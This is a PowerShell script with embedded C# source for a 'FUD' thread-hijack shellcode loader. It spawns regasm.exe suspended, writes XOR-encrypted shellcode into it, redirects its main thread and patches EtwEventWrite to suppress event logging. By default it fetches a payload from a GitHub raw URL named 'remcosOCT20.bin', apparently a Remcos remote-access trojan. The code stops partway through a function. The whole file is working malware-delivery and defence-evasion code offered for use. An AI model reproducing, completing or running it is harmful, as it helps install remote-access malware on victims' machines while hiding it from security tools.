<#
.SYNOPSIS
    PowerShell thread-hijack shellcode loader, regasm host, FUD staging (v3).

.DESCRIPTION
    v3 of the thread-hijack loader, regasm host. Same redirect engine with FUD
    staging: the payload is XOR-encrypted into a plain RW page (never RWX), the
    suspended thread is pointed at a tiny RX poll stub, and the host is resumed.
    During -DelayMs the process holds only ciphertext and the stub, so an
    injection-triggered memory scan has no shellcode to match. Afterwards the
    plaintext is written, the page is flipped to RX, and the stub jumps into it.

    The redirected thread is handed the same entry state a CreateRemoteThread
    start would give it: a call-aligned stack (esp 12 mod 16) with a return
    address pointing at a stub that exits the thread rather than faulting.

    Bitness is resolved at runtime:
        * 64-bit loader -> 32-bit WOW64 host : Wow64Get/SetThreadContext, x86 CONTEXT
        * 32-bit loader -> 32-bit host       : Get/SetThreadContext, x86 CONTEXT
        * 64-bit loader -> 64-bit host       : Get/SetThreadContext, AMD64 CONTEXT

    Base64 payloads are auto-detected; use -ForceBase64 to insist.

.PARAMETER Url
    Raw shellcode URL. Defaults to the crispy-spoon blob.

.PARAMETER PayloadPath
    Local payload file instead of -Url (handy for testing with benign bytes).

.PARAMETER TargetPath
    Host executable. Overrides -HostArch entirely.

.PARAMETER HostArch
    Which regasm.exe to spawn: x86 (Framework\v4.0.30319) or x64
    (Framework64\v4.0.30319). Must match the bitness of the shellcode.

.PARAMETER ForceBase64
    Treat the payload as base64 text even if auto-detection misses it.

.PARAMETER NoEtw
    Skip the EtwEventWrite / EtwEventWriteFull patch.

.PARAMETER WaitSeconds
    Wait this long for the host to exit and report its exit code (debug aid).

.PARAMETER GraceMs
    Default post-resume watch window in milliseconds. If the host exits inside
    it, the loader prints the exit code with a decoded meaning. 0 disables the
    check.

.PARAMETER DelayMs
    Milliseconds the staged payload stays encrypted before plaintext is written
    and execution is released. Default 3000. 0 disables the delay.

.PARAMETER Plain
    Skip FUD staging and write the shellcode plainly into an RWX page (v2 path).

.PARAMETER DryRun
    Compile, fetch, decode and resolve the host, then stop before spawning.

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File .\thread-hijack-loader-v3.ps1

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File .\thread-hijack-loader-v3.ps1 -HostArch x64 -DelayMs 5000

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File .\thread-hijack-loader-v3.ps1 -Plain -PayloadPath .\test-int3.bin -WaitSeconds 8
#>

[CmdletBinding()]
param(
    [string]$Url = 'https://github.com/i25968627-ui/stunning-tribble/raw/refs/heads/main/remcosOCT20.bin',
    [string]$PayloadPath,
    [string]$TargetPath,
    [ValidateSet('x86','x64')]
    [string]$HostArch = 'x86',
    [switch]$ForceBase64,
    [switch]$NoEtw,
    [int]$WaitSeconds = 0,
    [int]$GraceMs = 750,
    [int]$DelayMs = 3000,
    [switch]$Plain,
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }
try { [Net.ServicePointManager]::Expect100Continue = $false } catch { }

# ---------------------------------------------------------------------------
# In-memory helper. Single P/Invoke surface for staging + context redirect.
# ---------------------------------------------------------------------------
$source = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public static class ThLoader
{
    public class Result
    {
        public int Pid;
        public int Tid;
        public long RemoteBase;
        public long OriginalIp;
        public long ReadBackIp;
        public bool Verified;
        public string Arch;
        public bool Waited;
        public int ExitCode;
        public long OldEsp;
        public long NewEsp;
        public long Landing;
        public string LandingKind;
        public string Mode = "plain";
        public int DelayMs;
        public long StubBase;
        public long FlagBase;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    const uint CREATE_SUSPENDED           = 0x00000004;
    const uint CREATE_NO_WINDOW           = 0x08000000;
    const uint CREATE_BREAKAWAY_FROM_JOB  = 0x01000000;

    const uint MEM_COMMIT                 = 0x00001000;
    const uint MEM_RESERVE                = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE     = 0x00000040;
    const uint PAGE_READWRITE             = 0x00000004;
    const uint PAGE_EXECUTE_READ          = 0x00000020;

    const uint CONTEXT_i386_FULL          = 0x0001000B;
    const uint CONTEXT_AMD64_FULL         = 0x0010000B;

    const int CTX32_SIZE                  = 716;   // sizeof(WOW64_CONTEXT)
    const int CTX32_EIP                   = 0xB8;
    const int CTX32_ESP                   = 0xC4;
    const int CTX64_SIZE                  = 1232;  // sizeof(CONTEXT) on AMD64
    const int CTX64_FLAGS                 = 0x30;
    const int CTX64_RIP                   = 0xF8;
    const int CTX64_RSP                   = 0x98;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
        UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool IsWow64Process(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] out bool Wow64Process);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint SetErrorMode(uint uMode);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr LoadLibraryW(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
        UIntPtr nSize, out UIntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    // -----------------------------------------------------------------------
    // Small remote-inspection helpers: find a module in the target, resolve one
    // of its exports, and build the landing stub that a returning shellcode
    // falls into.
    // -----------------------------------------------------------------------
    static byte[] ReadBytes(IntPtr hProcess, long address, int size)
    {
        byte[] buffer = new byte[size];
        UIntPtr read;
        if (!ReadProcessMemory(hProcess, new IntPtr(address), buffer, new UIntPtr((ulong)size), out read))
            return null;
        if (read.ToUInt64() != (ulong)size)
            return null;
        return buffer;
    }

    // Walk page-aligned addresses downward from an address known to live inside
    // a mapped image until its MZ/PE header turns up. The thread's own entry
    // pointer is always inside ntdll, so this needs no module list.
    static long FindModuleBaseFromAddress(IntPtr hProcess, long address)
    {
        long candidate = address & ~0xFFFL;
        for (int i = 0; i < 0x800; i++)
        {
            if (candidate <= 0) break;
            byte[] head = ReadBytes(hProcess, candidate, 0x40);
            if (head != null && head[0] == 0x4D && head[1] == 0x5A)
            {
                int peOffset = BitConverter.ToInt32(head, 0x3C);
                if (peOffset > 0 && peOffset < 0x1000)
                {
                    byte[] signature = ReadBytes(hProcess, candidate + peOffset, 4);
                    if (signature != null && signature[0] == 0x50 && signature[1] == 0x45)
                        return candidate;
                }
            }
            candidate -= 0x1000;
        }
        return 0;
    }

    static IntPtr ResolveLanding(IntPtr hProcess, long entryIp, int bits, Result r)
    {
        long moduleBase = FindModuleBaseFromAddress(hProcess, entryIp);
        long exitFunction = FindExport(hProcess, moduleBase, "RtlExitUserThread", bits == 32);
        if (exitFunction == 0)
            exitFunction = FindExport(hProcess, moduleBase, "ExitThread", bits == 32);

        IntPtr landing = BuildLandingStub(hProcess, exitFunction, bits);
        r.Landing = landing.ToInt64();
        r.LandingKind = (landing == IntPtr.Zero) ? "none" : (exitFunction != 0 ? "ExitThread" : "spin");
        return landing;
    }

    static long FindExport(IntPtr hProcess, long moduleBase, string exportName, bool target32)
    {
        if (moduleBase == 0) return 0;

        byte[] dos = ReadBytes(hProcess, moduleBase, 0x40);
        if (dos == null) return 0;
        int peOffset = BitConverter.ToInt32(dos, 0x3C);
        if (peOffset <= 0 || peOffset > 0x1000) return 0;

        byte[] optional = ReadBytes(hProcess, moduleBase + peOffset + 24, 0xE0);
        if (optional == null) return 0;
        int dataDirectory = target32 ? 96 : 112;
        int exportRva = BitConverter.ToInt32(optional, dataDirectory);
        if (exportRva == 0) return 0;

        byte[] exportDir = ReadBytes(hProcess, moduleBase + exportRva, 40);
        if (exportDir == null) return 0;
        int nameCount = BitConverter.ToInt32(exportDir, 24);
        int functionsRva = BitConverter.ToInt32(exportDir, 28);
        int namesRva = BitConverter.ToInt32(exportDir, 32);
        int ordinalsRva = BitConverter.ToInt32(exportDir, 36);
        if (nameCount <= 0 || nameCount > 8192) return 0;

        byte[] names = ReadBytes(hProcess, moduleBase + namesRva, nameCount * 4);
        byte[] ordinals = ReadBytes(hProcess, moduleBase + ordinalsRva, nameCount * 2);
        if (names == null || ordinals == null) return 0;

        for (int i = 0; i < nameCount; i++)
        {
            int nameRva = BitConverter.ToInt32(names, i * 4);
            byte[] raw = ReadBytes(hProcess, moduleBase + nameRva, exportName.Length + 1);
            if (raw == null) continue;
            if (raw[raw.Length - 1] != 0) continue;
            if (!string.Equals(Encoding.ASCII.GetString(raw, 0, raw.Length - 1), exportName,
                               StringComparison.Ordinal))
            {
                continue;
            }

            int ordinal = BitConverter.ToUInt16(ordinals, i * 2);
            byte[] target = ReadBytes(hProcess, moduleBase + functionsRva + ordinal * 4, 4);
            if (target == null) return 0;
            return moduleBase + BitConverter.ToInt32(target, 0);
        }
        return 0;
    }

    // x86: push 0 ; mov eax, exit ; call eax ; jmp $
    //      (entry is 0 mod 16 after the shellcode's ret, so sub esp,12 and the
    //       push put the callee back on a call-aligned 12-mod-16 stack)
    // x64: sub rsp,20 ; xor ecx,ecx ; mov rax, exit ; call rax ; jmp $
    //      (entry is 0 mod 16 after ret; 0x20 keeps it there, and the call
    //       gives the callee the 8-mod-16 entry plus its 32-byte shadow space)
    // With no resolved exit function, a two-byte spin keeps the thread parked
    // instead of letting it fault.
    static IntPtr BuildLandingStub(IntPtr hProcess, long exitFunction, int bits)
    {
        byte[] stub;
        if (exitFunction != 0 && bits == 32)
        {
            stub = new byte[] { 0x83, 0xEC, 0x0C, 0x6A, 0x00, 0xB8, 0, 0, 0, 0,
                                0xFF, 0xD0, 0xEB, 0xFE };
            Array.Copy(BitConverter.GetBytes((uint)exitFunction), 0, stub, 6, 4);
        }
        else if (exitFunction != 0)
        {
            stub = new byte[] { 0x48, 0x83, 0xEC, 0x20, 0x31, 0xC9, 0x48, 0xB8,
                                0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xD0, 0xEB, 0xFE };
            Array.Copy(BitConverter.GetBytes(exitFunction), 0, stub, 8, 8);
        }
        else
        {
            stub = new byte[] { 0xEB, 0xFE };
        }

        IntPtr mem = AllocateRandom(hProcess, 0x1000);
        if (mem == IntPtr.Zero) return IntPtr.Zero;

        UIntPtr written;
        if (!WriteProcessMemory(hProcess, mem, stub, new UIntPtr((ulong)stub.Length), out written))
            return IntPtr.Zero;

        uint oldProtect;
        if (!VirtualProtectEx(hProcess, mem, new UIntPtr((ulong)stub.Length), PAGE_EXECUTE_READ, out oldProtect))
            return IntPtr.Zero;

        FlushInstructionCache(hProcess, mem, new UIntPtr((ulong)stub.Length));
        return mem;
    }

    static IntPtr AllocateRandom(IntPtr hProcess, int size)
    {
        Random rng = new Random(Guid.NewGuid().GetHashCode());
        for (int i = 0; i < 12; i++)
        {
            long hint = (long)rng.Next(0x1000, 0x3F00) << 16;
            IntPtr page = VirtualAllocEx(hProcess, (IntPtr)hint, new UIntPtr((ulong)size),
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (page != IntPtr.Zero) return page;
        }
        return VirtualAllocEx(hProcess, IntPtr.Zero, new UIntPtr((ulong)size),
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    static void PatchUInt32(List<byte> buffer, int at, uint value)
    {
        byte[] raw = BitConverter.GetBytes(value);
        for (int i = 0; i < 4; i++) buffer[at + i] = raw[i];
    }

    static void PatchInt64(List<byte> buffer, int at, long value)
    {
        byte[] raw = BitConverter.GetBytes(value);
        for (int i = 0; i < 8; i++) buffer[at + i] = raw[i];
    }

    // Poll stub: sleeps 100 ms at a time in NtDelayExecution until [flag] != 0,
    // then pushes landing + payload and returns into the payload with the same
    // call-aligned entry frame a thread start would give it. The payload page
    // stays RW and encrypted until the loader flips it to RX.
    static byte[] BuildSleepStub(int bits, long flagAddr, long ntDelay, long landing,
                                 long payload, long stubBase, out int codeLen)
    {
        List<byte> code = new List<byte>();
        if (bits == 32)
        {
            code.AddRange(new byte[] { 0x83, 0xEC, 0x04 });                 // sub esp,4
            code.AddRange(new byte[] { 0x83, 0x3D });                       // cmp dword [flag],0
            code.AddRange(BitConverter.GetBytes((uint)flagAddr));
            code.Add(0x00);

            int jneAt = code.Count;
            code.AddRange(new byte[] { 0x75, 0x00 });                       // jne go

            code.Add(0x68);                                                 // push interval
            int intervalAt = code.Count;
            code.AddRange(new byte[4]);
            code.AddRange(new byte[] { 0x6A, 0x01 });                       // push 1
            code.Add(0xB8);                                                 // mov eax, NtDelayExecution
            code.AddRange(BitConverter.GetBytes((uint)ntDelay));
            code.AddRange(new byte[] { 0xFF, 0xD0 });                       // call eax

            int jmpAt = code.Count;
            code.AddRange(new byte[] { 0xEB, 0x00 });                       // jmp loop

            int goAt = code.Count;
            code.AddRange(new byte[] { 0x83, 0xC4, 0x08 });                 // add esp,8
            code.Add(0x68);                                                 // push landing
            code.AddRange(BitConverter.GetBytes((uint)landing));
            code.Add(0x68);                                                 // push payload
            code.AddRange(BitConverter.GetBytes((uint)payload));
            code.Add(0xC3);                                                 // ret

            code[jneAt + 1] = (byte)(sbyte)(goAt - (jneAt + 2));
            code[jmpAt + 1] = (byte)(sbyte)(3 - (jmpAt + 2));

            codeLen = code.Count;
            PatchUInt32(code, intervalAt, (uint)(stubBase + codeLen));
            code.AddRange(BitConverter.GetBytes(-1000000L));                // -100 ms
        }
        else
        {
            code.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x28 });           // sub rsp,0x28
            code.AddRange(new byte[] { 0x83, 0x3C, 0x25 });                 // cmp dword [disp32],0
            code.AddRange(BitConverter.GetBytes((uint)flagAddr));
            code.Add(0x00);

            int jneAt = code.Count;
            code.AddRange(new byte[] { 0x75, 0x00 });                       // jne go

            code.AddRange(new byte[] { 0x48, 0xBA });                       // mov rdx, interval
            int intervalAt = code.Count;
            code.AddRange(new byte[8]);
            code.AddRange(new byte[] { 0xB9, 0x01, 0x00, 0x00, 0x00 });     // mov ecx,1
            code.AddRange(new byte[] { 0x48, 0xB8 });                       // mov rax, NtDelayExecution
            code.AddRange(BitConverter.GetBytes(ntDelay));
            code.AddRange(new byte[] { 0xFF, 0xD0 });                       // call rax

            int jmpAt = code.Count;
            code.AddRange(new byte[] { 0xEB, 0x00 });                       // jmp loop

            int goAt = code.Count;
            code.AddRange(new byte[] { 0x48, 0xB8 });                       // mov rax, landing
            code.AddRange(BitConverter.GetBytes(landing));
            code.Add(0x50);                                                 // push rax
            code.AddRange(new byte[] { 0x48, 0xB8 });                       // mov rax, payload
            code.AddRange(BitConverter.GetBytes(payload));
            code.Add(0x50);                                                 // push rax
            code.Add(0xC3);                                                 // ret

            code[jneAt + 1] = (byte)(sbyte)(goAt - (jneAt + 2));
            code[jmpAt + 1] = (byte)(sbyte)(4 - (jmpAt + 2));

            codeLen = code.Count;
            PatchInt64(code, intervalAt, stubBase + codeLen);
            code.AddRange(BitConverter.GetBytes(-1000000L));                // -100 ms
        }
        return code.ToArray();
    }

    // -----------------------------------------------------------------------
    // FUD staging:
    //   1. host spawned suspended
    //   2. payload written as XOR ciphertext into a private RW page (no RWX)
    //   3. thread redirected to a tiny RX poll stub
    //   4. resume, wait -DelayMs so an injection-triggered scan sees only
    //      ciphertext and a stub
    //   5. plaintext written, page flipped to RX, poll flag set
    //   6. stub returns into the payload on a call-aligned frame
    // -----------------------------------------------------------------------
    public static Result RunFud(string exePath, byte[] shellcode, int waitMs, int delayMs)
    {
        if (shellcode == null || shellcode.Length == 0)
            throw new ArgumentException("Empty shellcode buffer.");

        Result r = new Result();
        r.Mode = "fud";
        r.DelayMs = delayMs < 0 ? 0 : delayMs;

        uint previousErrorMode = SetErrorMode(0x0001 | 0x0002 | 0x8000);

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

        PROCESS_INFORMATION pi;
        uint flags = CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB;
        StringBuilder cmd = new StringBuilder("\"" + exePath + "\"");

        bool ok = CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, flags,
                                 IntPtr.Zero, null, ref si, out pi);
        if (!ok)
        {
            flags &= ~CREATE_BREAKAWAY_FROM_JOB;
            cmd = new StringBuilder("\"" + exePath + "\"");
            ok = CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, flags,
                                IntPtr.Zero, null, ref si, out pi);
        }
        SetErrorMode(previousErrorMode);
        if (!ok)
            throw new Exception("CreateProcessW failed: Win32=" + Marshal.GetLastWin32Error());

        bool resumed = false;
        try
        {
            bool wow64;
            if (!IsWow64Process(pi.hProcess, out wow64)) wow64 = false;
            int targetBits = wow64 ? 32 : 64;
            bool useWow64Api = (IntPtr.Size == 8) && (targetBits == 32);
            if (IntPtr.Size == 4 && targetBits == 64)
                throw new Exception("Target is 64-bit but this loader is 32-bit; bitness mismatch.");

            r.Pid = pi.dwProcessId;
            r.Tid = pi.dwThreadId;
            r.Arch = (targetBits == 32 ? "x86" : "x64") + (useWow64Api ? "/wow64" : "");

            long entryIp;
            long ntdllBase = 0;
            if (TryReadIp(pi.hThread, targetBits, useWow64Api, out entryIp))
                ntdllBase = FindModuleBaseFromAddress(pi.hProcess, entryIp);

            long ntDelay = 0;
            long exitFunction = 0;
            if (ntdllBase != 0)
            {
                ntDelay = FindExport(pi.hProcess, ntdllBase, "NtDelayExecution", targetBits == 32);
                exitFunction = FindExport(pi.hProcess, ntdllBase, "RtlExitUserThread", targetBits == 32);
            }

            if (ntDelay == 0 || exitFunction == 0)
            {
                TerminateProcess(pi.hProcess, 0);
                return Run(exePath, shellcode, waitMs);
            }

            IntPtr landing = BuildLandingStub(pi.hProcess, exitFunction, targetBits);
            r.Landing = landing.ToInt64();
            r.LandingKind = "ExitThread";

            IntPtr flag = AllocateRandom(pi.hProcess, 0x1000);
            IntPtr payload = AllocateRandom(pi.hProcess, shellcode.Length);
            IntPtr stubBase = AllocateRandom(pi.hProcess, 0x1000);
            if (flag == IntPtr.Zero || payload == IntPtr.Zero || stubBase == IntPtr.Zero)
                throw new Exception("FUD staging allocation failed");

            if (flag.ToInt64() > uint.MaxValue || payload.ToInt64() > uint.MaxValue ||
                stubBase.ToInt64() > uint.MaxValue)
            {
                throw new Exception("FUD staging requires allocations below 4 GB");
            }

            WriteDword(pi.hProcess, flag.ToInt64(), 0, "flag");

            byte[] key = new byte[32];
            new Random(Guid.NewGuid().GetHashCode()).NextBytes(key);
            byte[] cipher = new byte[shellcode.Length];
            for (int i = 0; i < shellcode.Length; i++)
                cipher[i] = (byte)(shellcode[i] ^ key[i % 32]);

            UIntPtr written;
            if (!WriteProcessMemory(pi.hProcess, payload, cipher, new UIntPtr((ulong)cipher.Length), out written) ||
                written.ToUInt64() != (ulong)cipher.Length)
            {
                throw new Exception("cipher WriteProcessMemory failed: Win32=" + Marshal.GetLastWin32Error());
            }

            int codeLen;
            byte[] stub = BuildSleepStub(targetBits, flag.ToInt64(), ntDelay, landing.ToInt64(),
                                         payload.ToInt64(), stubBase.ToInt64(), out codeLen);

            if (!WriteProcessMemory(pi.hProcess, stubBase, stub, new UIntPtr((ulong)stub.Length), out written) ||
                written.ToUInt64() != (ulong)stub.Length)
            {
                throw new Exception("stub WriteProcessMemory failed: Win32=" + Marshal.GetLastWin32Error());
            }

            uint oldProtect;
            if (!VirtualProtectEx(pi.hProcess, stubBase, new UIntPtr((ulong)stub.Length),
                                  PAGE_EXECUTE_READ, out oldProtect))
            {
                throw new Exception("stub VirtualProtectEx failed: Win32=" + Marshal.GetLastWin32Error());
            }
            FlushInstructionCache(pi.hProcess, stubBase, new UIntPtr((ulong)stub.Length));

            r.RemoteBase = payload.ToInt64();
            r.StubBase = stubBase.ToInt64();
            r.FlagBase = flag.ToInt64();

            long original;
            Hijack(pi.hProcess, pi.hThread, targetBits, useWow64Api, stubBase, landing, r, out original);
            r.OriginalIp = original;

            long readBack;
            r.Verified = TryReadIp(pi.hThread, targetBits, useWow64Api, out readBack);
            r.ReadBackIp = readBack;
            if (r.Verified && readBack != stubBase.ToInt64())
                throw new Exception("Context read-back mismatch: ip=0x" + readBack.ToString("X"));

            uint suspension = ResumeThread(pi.hThread);
            if (suspension == 0xFFFFFFFF)
                throw new Exception("ResumeThread failed: Win32=" + Marshal.GetLastWin32Error());
            resumed = true;

            if (r.DelayMs > 0) Thread.Sleep(r.DelayMs);

            if (!WriteProcessMemory(pi.hProcess, payload, shellcode,
                                    new UIntPtr((ulong)shellcode.Length), out written) ||
                written.ToUInt64() != (ulong)shellcode.Length)
            {
                throw new Exception("payload WriteProcessMemory failed: Win32=" + Marshal.GetLastWin32Error());
            }

            uint oldPayloadProtect;
            if (!VirtualProtectEx(pi.hProcess, payload, new UIntPtr((ulong)shellcode.Length),
                                  PAGE_EXECUTE_READ, out oldPayloadProtect))
            {
                throw new Exception("payload VirtualProtectEx failed: Win32=" + Marshal.GetLastWin32Error());
            }
            FlushInstructionCache(pi.hProcess, payload, new UIntPtr((ulong)shellcode.Length));

            WriteDword(pi.hProcess, flag.ToInt64(), 1, "flag");

            if (waitMs >= 0)
            {
                uint signaled = WaitForSingleObject(pi.hProcess, (uint)waitMs);
                if (signaled == 0)
                {
                    uint code;
                    if (GetExitCodeProcess(pi.hProcess, out code))
                    {
                        r.Waited = true;
                        r.ExitCode = unchecked((int)code);
                    }
                }
            }

            return r;
        }
        finally
        {
            if (!resumed)
            {
                try { TerminateProcess(pi.hProcess, 0); }
                catch { }
            }
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }

    static void WriteDword(IntPtr hProcess, long address, uint value, string what)
    {
        UIntPtr wrote;
        byte[] raw = BitConverter.GetBytes(value);
        if (!WriteProcessMemory(hProcess, new IntPtr(address), raw, new UIntPtr((ulong)raw.Length), out wrote))
            throw new Exception("WriteProcessMemory(" + what + ") failed: Win32=" + Marshal.GetLastWin32Error());
    }

    static void WriteQword(IntPtr hProcess, long address, long value, string what)
    {
        UIntPtr wrote;
        byte[] raw = BitConverter.GetBytes(value);
        if (!WriteProcessMemory(hProcess, new IntPtr(address), raw, new UIntPtr((ulong)raw.Length), out wrote))
            throw new Exception("WriteProcessMemory(" + what + ") failed: Win32=" + Marshal.GetLastWin32Error());
    }

    // -----------------------------------------------------------------------
    // ETW: EtwEventWrite/Full are the user-mode funnel for EventWrite. Inline
    // them with `xor eax,eax ; ret` so every event reports STATUS_SUCCESS and
    // nothing is emitted. Restores the original page protection afterwards.
    // -----------------------------------------------------------------------
    public static string PatchEtw()
    {
        IntPtr ntdll = LoadLibraryW("ntdll.dll");
        if (ntdll == IntPtr.Zero)
            throw new Exception("LoadLibraryW(ntdll.dll) failed: " + Marshal.GetLastWin32Error());

        byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
        string[] names = new string[] { "EtwEventWrite", "EtwEventWriteFull" };
        StringBuilder log = new StringBuilder();

        foreach (string name in names)
        {
            IntPtr fn = GetProcAddress(ntdll, name);
            if (fn == IntPtr.Zero) { log.Append(name + "=missing "); continue; }

            uint oldProtect;
            if (!VirtualProtect(fn, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
            {
                log.Append(name + "=protect_failed(" + Marshal.GetLastWin32Error() + ") ");
                continue;
            }

            Marshal.Copy(patch, 0, fn, patch.Length);

            uint ignored;
            VirtualProtect(fn, (UIntPtr)patch.Length, oldProtect, out ignored);
            FlushInstructionCache(GetCurrentProcess(), fn, (UIntPtr)patch.Length);
            log.Append(name + "@0x" + fn.ToInt64().ToString("X") + " ");
        }

        return log.ToString().Trim();
    }

    // -----------------------------------------------------------------------
    // Spawn suspended, stage shellcode, redirect the primary thread, resume.
    //
    // regasm.exe exits on its own when launched bare (measured exit code 0;
    // AddInProcess32 exits 1), so the host is always created suspended and the
    // redirect lands before the thread can ever run.
    // -----------------------------------------------------------------------
    public static Result Run(string exePath, byte[] shellcode, int waitMs)
    {
        if (shellcode == null || shellcode.Length == 0)
            throw new ArgumentException("Empty shellcode buffer.");

        // Inherited by the child: suppress WER / critical-error dialogs if the
        // payload faults instead of exiting cleanly. Restored for this process
        // as soon as the host exists.
        uint previousErrorMode = SetErrorMode(0x0001 | 0x0002 | 0x8000);

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

        PROCESS_INFORMATION pi;
        uint flags = CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB;
        StringBuilder cmd = new StringBuilder("\"" + exePath + "\"");

        bool ok = CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, flags,
                                 IntPtr.Zero, null, ref si, out pi);
        if (!ok)
        {
            // Job object without JOB_OBJECT_LIMIT_BREAKAWAY_OK: drop the flag.
            flags &= ~CREATE_BREAKAWAY_FROM_JOB;
            cmd = new StringBuilder("\"" + exePath + "\"");
            ok = CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, flags,
                                IntPtr.Zero, null, ref si, out pi);
        }
        SetErrorMode(previousErrorMode);
        if (!ok)
            throw new Exception("CreateProcessW failed: Win32=" + Marshal.GetLastWin32Error());

        try
        {
            bool wow64;
            if (!IsWow64Process(pi.hProcess, out wow64))
                wow64 = false;

            // True for a 32-bit target whether the caller is 32- or 64-bit;
            // false only for a 64-bit target.
            int targetBits = wow64 ? 32 : 64;
            bool useWow64Api = (IntPtr.Size == 8) && (targetBits == 32);

            if (IntPtr.Size == 4 && targetBits == 64)
                throw new Exception("Target is 64-bit but this loader is 32-bit; bitness mismatch.");

            int len = shellcode.Length;

            // 32-bit targets need the payload reachable inside their own 4 GB
            // window. Hint low bases first, fall back to a kernel-chosen page.
            long[] hints = new long[] { 0x10000000L, 0x20000000L, 0x30000000L, 0L };
